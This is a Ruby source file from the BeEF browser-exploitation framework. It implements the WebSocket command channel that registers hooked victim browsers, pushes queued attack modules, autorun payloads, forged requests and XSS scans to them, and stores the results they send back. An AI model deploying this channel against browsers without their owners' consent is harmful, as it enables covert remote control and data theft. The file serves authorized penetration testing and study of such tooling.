#
# Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Core
    module Websocket
      require 'singleton'
      require 'json'
      require 'base64'
      require 'em-websocket'
      class Websocket
        include Singleton
        include BeEF::Core::Handlers::Modules::Command

        @@activeSocket= Hash.new
        @@lastalive= Hash.new
        @@config = BeEF::Core::Configuration.instance
        #@@wsopt=nil
        MOUNTS = BeEF::Core::Server.instance.mounts

        def initialize


          secure = @@config.get("beef.http.websocket.secure")
          @root_dir = File.expand_path('../../../../../', __FILE__)

          if (secure)
            ws_secure_options = {:host => "0.0.0.0", :port => @@config.get("beef.http.websocket.secure_port"), :secure => true,
                     :tls_options => {
                         :private_key_file => @root_dir+"/"+@@config.get("beef.http.https.key"),
                         :cert_chain_file => @root_dir+"/"+ @@config.get("beef.http.https.cert")
                     }
            }
            # @note Start a WSS server socket
            start_websocket_server(ws_secure_options, true)
          end

          # @note Start a WS server socket
          ws_options = {:host => "0.0.0.0", :port => @@config.get("beef.http.websocket.port")}
          start_websocket_server(ws_options,false)
        end

        def start_websocket_server(ws_options, secure)
          Thread.new {
            sleep 2 # prevent issues when starting at the same time the TunnelingProxy, Thin and Evented WebSockets
            EventMachine.run {
              EventMachine::WebSocket.start(ws_options) do |ws|
                begin
                  secure ? print_debug("New WebSocketSecure channel open.") : print_debug("New WebSocket channel open.")
                  ws.onmessage { |msg|
                    begin
                      msg_hash = JSON.parse(msg)

                    if (msg_hash["cookie"]!= nil)
                      print_debug("WebSocket - Browser says helo! WebSocket is running")
                      #insert new connection in activesocket
                      @@activeSocket["#{msg_hash["cookie"]}"] = ws
                      print_debug("WebSocket - activeSocket content [#{@@activeSocket}]")
                    elsif msg_hash["alive"] != nil
                      hooked_browser = BeEF::Core::Models::HookedBrowser.first(:session => msg_hash["alive"])
                      unless hooked_browser.nil?
                        hooked_browser.lastseen = Time.new.to_i
                        hooked_browser.count!
                        hooked_browser.save

                        #Check if new modules need to be sent
                        zombie_commands = BeEF::Core::Models::Command.all(:hooked_browser_id => hooked_browser.id, :instructions_sent => false)
                        zombie_commands.each { |command| add_command_instructions(command, hooked_browser) }

                        # Check if there are any ARE rules to be triggered. If is_sent=false rules are triggered
                        are_body = ''
                        are_executions = BeEF::Core::AutorunEngine::Models::Execution.all(:is_sent => false, :session => hooked_browser.session)
                        are_executions.each do |are_exec|
                          are_body += are_exec.mod_body
                          are_exec.update(:is_sent => true, :exec_time => Time.new.to_i)
                        end
                        @@activeSocket[hooked_browser.session].send(are_body) unless are_body.empty?

                        #@todo antisnatchor:
                        #@todo - re-use the pre_hook_send callback mechanisms to have a generic check for multipl extensions
                        #Check if new forged requests need to be sent (Requester/TunnelingProxy)
                        dhook = BeEF::Extension::Requester::API::Hook.new
                        dhook.requester_run(hooked_browser, '')

                        #Check if new XssRays scan need to be started
                        xssrays = BeEF::Extension::Xssrays::API::Scan.new
                        xssrays.start_scan(hooked_browser, '')
                      end
                    else
                      #json recv is a cmd response decode and send all to
                      #we have to call dynamicreconstructor handler camp must be websocket
                      #print_debug("Received from WebSocket #{messageHash}")
                      execute(msg_hash)
                    end
                    rescue => e
                      print_error "WebSocket - something wrong in msg handling - skipped: #{e}"
                    end
                  }
                rescue => e
                  print_error "WebSocket staring error: #{e}"
                end
              end
            }
          }
        end

        #@note retrieve the right websocket channel given an hooked browser session
        #@param [String] session the hooked browser session
        def getsocket (session)
          if (@@activeSocket[session] != nil)
            true
          else
            false
          end
        end

        #@note send a function to hooked and ws browser
        #@param [String] fn the module to execute
        #@param [String] session the hooked browser session
        def send (fn, session)
          @@activeSocket[session].send(fn)
        end

        # command result data comes back encoded like:
        # beef.encode.base64.encode(beef.encode.json.stringify(results)
        # we need to unescape the stringified data after base64 decoding.
        def unescape_stringify(str)
          chars = {
              'a' => "\x07", 'b' => "\x08", 't' => "\x09", 'n' => "\x0a", 'v' => "\x0b", 'f' => "\x0c",
              'r' => "\x0d", 'e' => "\x1b", "\\\\" => "\x5c", "\"" => "\x22", "'" => "\x27"
          }
          # Escape all the things
          str.gsub(/\\(?:([#{chars.keys.join}])|u([\da-fA-F]{4}))|\\0?x([\da-fA-F]{2})/) {
            if $1
              if $1 == '\\'
              then '\\'
              else
                chars[$1]
              end
            elsif $2
              ["#$2".hex].pack('U*')
            elsif $3
              [$3].pack('H2')
            end
          }
        end

        #call the handler for websocket cmd response
        #@param [Hash] data contains the answer of a command
        def execute (data)
          command_results=Hash.new

          # the last gsub is to remove leading/trailing double quotes from the result value.
          command_results["data"] = unescape_stringify(Base64.decode64(data['result'])).gsub!(/\A"|"\Z/, '')
          command_results["data"].force_encoding('UTF-8') if command_results["data"] != nil
          hooked_browser = data["bh"]
          handler = data["handler"]
          command_id = data["cid"]
          command_status = data["status"]

          (print_error "BeEFhook is invalid"; return) unless BeEF::Filters.is_valid_hook_session_id?(hooked_browser)
          (print_error "command_id is invalid"; return) unless BeEF::Filters.is_valid_command_id?(command_id)
          (print_error "command name is empty"; return) if handler.empty?
          (print_error "command results are empty"; return) if command_results.empty?
          (print_error "command status is invalid"; return) unless command_status =~ /\A0|1|2|undefined\z/

          command_mod = "beef.module.#{handler.gsub('/command/','').gsub('.js','')}"
          command_name = @@config.get("#{command_mod}.class")

          data["status"] == "undefined" ? status = 0 : status = data["status"].to_i

          if handler.match(/command/)

            command = BeEF::Core::Command.const_get(command_name.capitalize)
            command_obj = command.new(BeEF::Module.get_key_by_class(command_name))
            command_obj.build_callback_datastore(command_results["data"], command_id, hooked_browser, nil, nil)
            command_obj.session_id = hooked_browser
            if command_obj.respond_to?(:post_execute)
              command_obj.post_execute
            end

            BeEF::Core::Models::Command.save_result(hooked_browser,
              data["cid"],
              @@config.get("#{command_mod}.name"),
              command_results,
              status)
          else #processing results from extensions, call the right handler
            data["beefhook"] = hooked_browser
            data["results"] = JSON.parse(Base64.decode64(data["result"]))
            if MOUNTS.has_key?(handler)
              if MOUNTS[handler].class == Array and MOUNTS[handler].length == 2
                MOUNTS[handler][0].new(data, MOUNTS[handler][1])
              else
                MOUNTS[handler].new(data)
              end
            end
          end

        end
      end
    end
  end
end
